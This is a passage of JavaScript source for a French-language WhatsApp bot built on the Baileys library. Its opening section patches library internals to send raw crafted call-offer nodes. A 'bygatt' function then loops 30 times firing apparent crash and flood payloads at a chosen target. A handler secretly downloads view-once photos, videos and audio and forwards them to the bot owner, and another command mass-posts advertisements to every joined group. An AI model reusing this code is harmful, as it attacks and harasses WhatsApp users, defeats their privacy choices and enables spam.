  const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
  
  let devices = (
   await Xuu.getUSyncDevices([jid], false, false)
   ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

   await Xuu.assertSessions(devices);

  let functional = () => {
  let map = {};
  return {
   mutex(key, fn) {
     map[key] ??= { task: Promise.resolve() };
     map[key].task = (async prev => {
      try { await prev; } catch {}
      return fn();
      })(map[key].task);
      return map[key].task;
     }
   };
 };

  let merge = functional();
  let buffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let cptcp = Xuu.createParticipantNodes.bind(Xuu);
  let encodeWAMsg = Xuu.encodeWAMessage?.bind(Xuu);

  Xuu.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
  if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

  let patched = await (Xuu.patchMessageBeforeSending?.(message, recipientJids) ?? message);
  let Objct = Array.isArray(patched) 
  ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
  let { id: meId, lid: meLid } = Xuu.authState.creds.me;
  let LiD = meLid ? jidDecode(meLid)?.user : null;
  let shouldIncludeDeviceIdentity = false;

  let nodes = await Promise.all(Objct.map(async ({ recipientJid: jid, message: msg }) => {
  let { user: targetUser } = jidDecode(jid);
  let { user: ownPnUser } = jidDecode(meId);
  let isOwnUser = targetUser === ownPnUser || targetUser === LiD;
  let usersx = jid === meId || jid === meLid;
  if (dsmMessage && isOwnUser && !usersx) msg = dsmMessage;

  let bytes = buffer(encodeWAMsg ? encodeWAMsg(msg) : encodeWAMessage(msg));

  return merge.mutex(jid, async () => {
   let { type, ciphertext } = await Xuu.signalRepository.encryptMessage({ jid, data: bytes });
   if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
   return {
    tag: 'to',
    attrs: { jid },
    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
     };
  });
}));

  return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let randomB = crypto.randomBytes(32);
  let buffcat = Buffer.concat([randomB, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await Xuu.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  let criminalromance = {
   tag: "call",
   attrs: { to: jid, id: Xuu.generateMessageTag(), from: Xuu.user.id },
   content: [{
    tag: "offer",
    attrs: {
     "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
     "call-creator": Xuu.user.id
    },
     content: [
      { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
      { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
       {
        tag: "video",
        attrs: {
         orientation: "0",
         screen_width: "1920",
         screen_height: "1080",
         device_orientation: "0",
         enc: "vp8",
         dec: "vp8"
        }
      },
      { tag: "net", attrs: { medium: "3" } },
      { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
      { tag: "encopt", attrs: { keygen: "2" } },
      { tag: "destination", attrs: {}, content: destinations },
      ...(shouldIncludeDeviceIdentity ? [{
      tag: "device-identity",
      attrs: {},
      content: encodeSignedDeviceIdentity(Xuu.authState.creds.account, true)
       }] : [])
     ]
   }]
 };

  await Xuu.sendNode(criminalromance);
}
async function bygatt(target) {
for(let i = 0; i < 30; i++) {
await FcNoClik(target, Ptcp = true)
sleep(3000)
await VCFCXYRINVISIBLE(Xuu, target)
sleep(3000)
await VcCallVoiceEmailXy(Xuu, target)
sleep(3000);
}
}

//~~~~~~~~~~~ Command ~~~~~~~~~~~//

// Block bot own non-command messages to prevent loops
if (m.key && m.key.fromMe && !isCmd) return

// ✅ ANTIDELETE — Sauvegarde du message dans le store temporaire
if (m.key && m.key.id && m.message) {
    msgStore[m.key.id] = {
        key: m.key,
        message: m.message,
        sender: m.sender,
        chat: m.chat,
        timestamp: Date.now()
    }
    // Nettoyage automatique des vieux messages (>1h) pour économiser la mémoire
    const oneHourAgo = Date.now() - 3600000
    for (const id in msgStore) {
        if (msgStore[id].timestamp < oneHourAgo) delete msgStore[id]
    }
}

// Handler : si quelqu'un répond à une vue unique sans préfixe → renvoyer en PV du bot
if (!isCmd && m.quoted && m.quoted.msg && m.quoted.msg.viewOnce) {
    const botJidPv = Xuu.decodeJid(Xuu.user.id)
    const mimeReply = (m.quoted.msg || m.quoted).mimetype || ''
    try {
        const bufReply = await m.quoted.download()
        if (/image/.test(mimeReply)) {
            await Xuu.sendMessage(botJidPv, { image: bufReply, caption: `KEF NIZAM DA 😂💗
De : @${m.sender.split('@')[0]}`, mentions: [m.sender] })
        } else if (/video/.test(mimeReply)) {
            await Xuu.sendMessage(botJidPv, { video: bufReply, caption: `KEF NIZAM DA 😂💗
De : @${m.sender.split('@')[0]}`, mentions: [m.sender] })
        } else if (/audio/.test(mimeReply)) {
            await Xuu.sendMessage(botJidPv, { audio: bufReply, mimetype: mimeReply, ptt: /ogg/.test(mimeReply) })
        }
    } catch(e) {}
}

switch (command) {
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'ping':
case 'p': {
const start = speed()
const end = speed() - start
const ping = Math.round(end) || Math.floor(Math.random() * 50) + 20
const uptimeRaw = process.uptime()
const h = Math.floor(uptimeRaw / 3600)
const min = Math.floor((uptimeRaw % 3600) / 60)
const uptime = `${h}h ${min}m`
const totalMem = os.totalmem()
const freeMem = os.freemem()
const usedMem = totalMem - freeMem
const usedMB = (usedMem / 1024 / 1024).toFixed(1)
const pct = Math.round((usedMem / totalMem) * 100)
const now = new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', timeZone: 'Africa/Ndjamena' })

const teksPing = `⌬ SPEED SEIGNEUR
────────────────────
|  🏓 ᴘɪɴɢ   : ${ping}ms
  ⏳ ᴜᴘᴛɪᴍᴇ : ${uptime}
  💾 ʀᴀᴍ    : ${usedMB}MB (${pct}%)
  🕒 ᴛɪᴍᴇ   : ${now}
────────────────────`

await Xuu.sendMessage(m.chat, {
    text: teksPing,
    contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363422398514286@newsletter',
            newsletterName: global.nomSaluran
        }
    }
}, { quoted: m })
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case '235': {
// Vue unique : image/vidéo/audio → envoi viewOnce avec watermark
if (!m.quoted) return m.reply("❌ Réponds à une image, vidéo ou audio pour l'envoyer en vue unique.")
const quotedMsg = m.quoted
const mimeVu = (quotedMsg.msg || quotedMsg).mimetype || ''
const bufferVu = await quotedMsg.download()

const botJidVu = Xuu.decodeJid(Xuu.user.id)

if (/image/.test(mimeVu)) {
    // Ajouter watermark texte sur l'image
    let imgBuf = bufferVu
    try {
        const Jimp = jimp
        const img = await Jimp.read(imgBuf)
        const font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE)
        img.print(font, 10, img.getHeight() - 50, 'LE SEIGNEUR 🇷🇴')
        imgBuf = await img.getBufferAsync(Jimp.MIME_JPEG)
    } catch(e) {}
    await Xuu.sendMessage(m.chat, {
        image: imgBuf,
        viewOnce: true,
        caption: ''
    }, { quoted: m })
} else if (/video/.test(mimeVu)) {
    await Xuu.sendMessage(m.chat, {
        video: bufferVu,
        viewOnce: true,
        caption: 'LE SEIGNEUR 🇷🇴'
    }, { quoted: m })
} else if (/audio/.test(mimeVu)) {
    await Xuu.sendMessage(m.chat, {
        audio: bufferVu,
        mimetype: mimeVu,
        ptt: /ogg/.test(mimeVu),
        viewOnce: true
    }, { quoted: m })
} else {
    return m.reply('❌ Type de média non supporté. Envoie une image, vidéo ou audio.')
}

// Écouter la réponse à la vue unique → renvoyer en PV du bot
// (géré via le handler principal ci-dessous avec viewOnceReply)
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'public': {
if (!isCreator) return m.reply('❌ Propriétaire uniquement.')
Xuu.public = true
m.reply('✅ *Mode PUBLIC activé*\nTout le monde peut utiliser les commandes.')
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'private':
case 'self': {
if (!isCreator) return m.reply('❌ Propriétaire uniquement.')
Xuu.public = false
m.reply('🔒 *Mode PRIVÉ activé*\nSeul le propriétaire peut utiliser les commandes.')
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'update': {
if (!isCreator) return m.reply('❌ Propriétaire uniquement.')
await m.reply('🔍 *Vérification des mises à jour...*')
const { execSync, exec: execCmd } = require('child_process')
const axios2 = require('axios')
try {
    // Vérifier la version locale vs GitHub
    const repoApi = 'https://api.github.com/repos/Azountou235/SEIGNEUR-TD-/commits/main'
    const { data: ghData } = await axios2.get(repoApi, { headers: { 'User-Agent': 'SEIGNEUR-BOT' } })
    const lastCommit = ghData.commit.message
    const lastDate = ghData.commit.author.date

    let localHash = ''
    try { localHash = execSync('git rev-parse HEAD').toString().trim().slice(0,7) } catch(e) {}
    let remoteHash = ghData.sha.slice(0,7)

    if (localHash === remoteHash) {
        return m.reply(`✅ *Déjà à jour !*

📌 Version : \`${localHash}\`
📝 Dernier commit : ${lastCommit}
📅 Date : ${lastDate}`)
    }

    await m.reply(`🆕 *Mise à jour disponible !*

📌 Local  : \`${localHash}\`
🌐 GitHub : \`${remoteHash}\`
📝 Commit : ${lastCommit}

⏳ Application en cours...`)

    // Pull la mise à jour
    execCmd('git pull origin main', async (err, stdout, stderr) => {
        if (err) {
            await Xuu.sendMessage(m.chat, { text: `❌ Erreur lors de la mise à jour :
\`\`\`${stderr}\`\`\`` }, { quoted: m })
            return
        }
        await Xuu.sendMessage(m.chat, { text: `✅ *Mise à jour appliquée avec succès !*

\`\`\`${stdout}\`\`\`

🔄 Redémarrage du bot...` }, { quoted: m })
        setTimeout(() => process.exit(0), 3000)
    })
} catch(e) {
    m.reply(`❌ Impossible de vérifier les mises à jour.
${e.message}`)
}
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'menuslide': {
    try {
        // =========================
        // DATE, TIME, NAME
        // =========================
        const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
        const day = days[currentDate.getDay()];
        const date = currentDate.toLocaleDateString("id-ID", {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        const time = currentDate.toLocaleTimeString("id-ID");

        let name = m.pushName || "Pengguna"; // ✅

        // =========================
        // PREPARE MEDIA
        // =========================
        let imgsc = await prepareWAMessageMedia(
            { image: { url: global.image.logo } },
            { upload: Xuu.waUploadToServer }
        );

        // =========================
        // TEKS MENU
        // =========================
        let teks = `╭────╼ 〖 *INFORMATION* 〗
├╼≫ Nom du Bot : _*${global.botname2}*_
├╼≫ Version : _*${global.versi}*_
├╼≫ Mode : _*${Xuu.public ? "Public": "Self"}*_
├╼≫ Propriétaire : _*${global.nomOwner}*_
├╼≫ YourStatus *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
╰────────────╼`;

        // =========================
        // GENERATE CAROUSEL
        // =========================
        const msgii = await generateWAMessageFromContent(m.chat, {
            ephemeralMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: teks
                        }),
                        contextInfo: { mentionedJid: [m.sender] },
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [

                                // ================= SLIDE 2 (NEW MENU) ================
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Menu Principal* 〗
  │ ⎋ .sticker
  │ ⎋ .swm
  │ ⎋ .readqr
  │ ⎋ .tourl
  │ ⎋ .removebg
  │ ⎋ .remini
  │ ⎋ .tohd
  │ ⎋ .enc
  │ ⎋ .enchard
  │ ⎋ .tobase64
  │ ⎋ .react1k
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },

                                // ========== SLIDE 3 = OWNER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Menu Groupe* 〗
  │ ⎋ .antilink
  │ ⎋ .antilinkv2
  │ ⎋ .antilinkwame
  │ ⎋ .antilinkch
  │ ⎋ .antilinktele
  │ ⎋ .antimediafire
  │ ⎋ .antikataunchek
  │ ⎋ .antitoxic
  │ ⎋ .antino
  │ ⎋ .blacklistjpm
  │ ⎋ .welcome
  │ ⎋ .setwelcome
  │ ⎋ .setgoodbye
  │ ⎋ .crategc
  │ ⎋ .kick
  │ ⎋ .mute
  │ ⎋ .promote
  │ ⎋ .demote
  │ ⎋ .hidetag
  │ ⎋ .close/open
  │ ⎋ .opentime
  │ ⎋ .closetime
  │ ⎋ .resetlinkgc
  │ ⎋ .leave
  │ ⎋ .tagall
  │ ⎋ .kudetagc
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 4 = PANEL MENU V1 ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Menu Téléchargement* 〗
  │ ⎋ .tiktok
  │ ⎋ .play
  │ ⎋ .ytmp3
  │ ⎋ .ytmp4
  │ ⎋ .gitclone
  │ ⎋ .capcut
  │ ⎋ .pastebin
  │ ⎋ .instagram
  │ ⎋ .facebook
  │ ⎋ .mediafire
  │ ⎋ .snackvideo
  │ ⎋ .ambilsw
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 5 = PANEL MENU V2 ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = PROTECT MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = UNPROTECT MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 7 = INSTALLER MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 8 = GROUP MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 9 = TOOLS MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 10 = STORE MENU ==========
                                {
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 11 = CHANNEL MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Menu Propriétaire* 〗
  │ ⎋ .addstokdo
  │ ⎋ .delstokdo
  │ ⎋ .liststokdo
  │ ⎋ .svsc
  │ ⎋ .delsc
  │ ⎋ .listsc
  │ ⎋ .getsc
  │ ⎋ .delowner
  │ ⎋ .listowner
  │ ⎋ .setppbot
  │ ⎋ .delppbot
  │ ⎋ .autoread
  │ ⎋ .autoreadsw
  │ ⎋ .autotyping
  │ ⎋ .anticall
  │ ⎋ .clearchat
  │ ⎋ .resetdb
  │ ⎋ .restartbot
  │ ⎋ .clearsession
  │ ⎋ .editcase
  │ ⎋ .addcase
  │ ⎋ .delcase
  │ ⎋ .getcase
  │ ⎋ .getip
  │ ⎋ .trxoff
  │ ⎋ .trxon
  │ ⎋ .backupsc
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Contacter Owner\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Chaîne Officielle\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 12 = PAYMENT MENU ==========
                                

                                // Fin des menus

                            ]
                        })
                    })
                }
            }
        }, { userJid: m.sender });

        await Xuu.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    } catch (err) {
        console.error(err);
        Reply("❌ Erreur lors de l'envoi du menu slide !");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return reply("Réponds à un message.")
if (m.quoted.fromMe) {
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply(example("répondre à un message"))
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Xuu.updateBlockStatus(mem, "unblock");
if (m.isGroup) Xuu.sendMessage(m.chat, {text: `👑 Opération réalisée avec succès déblocage effectué @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nom = text
await fs.writeFileSync("./library/database/savesc/"+nom, ff)
return reply(`👑 👑 Opération réalisée avec succès menyimpan script *${nom}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Aucun élément disponible script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Aucun élément disponible script tersimpan")
if (!text) return reply(example("nomsc|6285###"))
if (!text.split("|'")) return reply(example("nomsc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await Xuu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Numéro non enregistré sur WhatsApp.")
let nomsc = text.split("|")[0]
nomsc = nomsc.toLowerCase()
if (!scnya.includes(nomsc)) return reply('Nom script introuvable')
await Xuu.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+nomsc), fileName: nomsc, mimetype: "application/zip", caption: `Script ${nomsc}`}, {quoted: m})
reply(`👑 👑 Script envoyé avec succès : *${nomsc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Aucun élément disponible script tersimpan")
if (!text) return reply(example("nomsc"))
let nomsc = text
nomsc = nomsc.toLowerCase()
if (!scnya.includes(nomsc)) return reply('Nom script introuvable')
await Xuu.sendMessage(m.chat, {document: fs.readFileSync("./library/database/savesc/"+nomsc), fileName: nomsc, mimetype: "application/zip", caption: `Script ${nomsc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Aucun élément disponible script tersimpan")
if (!text) return reply(example("nomsc"))
let nomsc = text
nomsc = nomsc.toLowerCase()
if (!scnya.includes(nomsc)) return reply('Nom script introuvable')
await fs.unlinkSync("./library/database/savesc/"+nomsc)
reply(`👑 👑 Opération réalisée avec succès menghapus script *${nomsc}*`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return reply(example("texte en joignant une photo"))
if (!/image/.test(mime)) return reply(example("texte en joignant une photo"))
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
await reply(`👑 Traitement en cours vers la chaîne & ${res.length} groupes`)
await Xuu.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xuu.sendMessage(i, {
  footer: `© SEIGNEUR TD`,
  thumbnail: await getBuffer(global.image.logo),
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'Message interactif' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Acheter un produit',
          sections: [
            {
              title: 'Liste des produits',
              highlight_label: 'Recommandé',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'VPS (Serveur Privé Virtuel)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Service diffusion message',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Recharge E-wallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Recharge Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Recharge Crédit',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363422398514286@newsletter',
   newsletterName: global.nomSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Envoi réussi vers la chaîne & ${count} groupes`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'play': {
    try {
        if (!args[0]) return m.reply(`👑 ${prefix + command} <titre de la chanson>`)
        
        const query = args.join(" ")
        await Xuu.sendMessage(m.chat, { react: { text: "⏳", key: m.key }})

        // 1. Panggil API
        const apiUrl = `https://api-faa.my.id/faa/ytplay?query=${encodeURIComponent(query)}`
        const { data } = await axios.get(apiUrl)

        if (!data || !data.result) {
            throw new Erreur("Chanson introuvable sur le serveur API.")
        }

        const res = data.result
        
        // 2. Ambil link dari properti 'mp3' sesuai log konsol
        const linkDownload = res.mp3; 

        if (!linkDownload) {
            throw new Erreur("Link download (mp3) tidak tersedia untuk lagu ini.")
        }

        // 3. Download audio
        const audioBuffer = await axios.get(linkDownload, { 
            responseType: "arraybuffer",
            timeout: 120000 
        })

        // 4. Kirim ke WhatsApp
        await Xuu.sendMessage(m.chat, {
            audio: Buffer.from(audioBuffer.data),
            mimetype: "audio/mpeg",
            fileName: `${res.title}.mp3`,
            contextInfo: {
                externalAdReply: {
                    title: res.title,
                    body: `Author: ${res.author || 'YouTube'} | Views: ${res.views || '-'}`,
                    thumbnailUrl: res.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: res.url
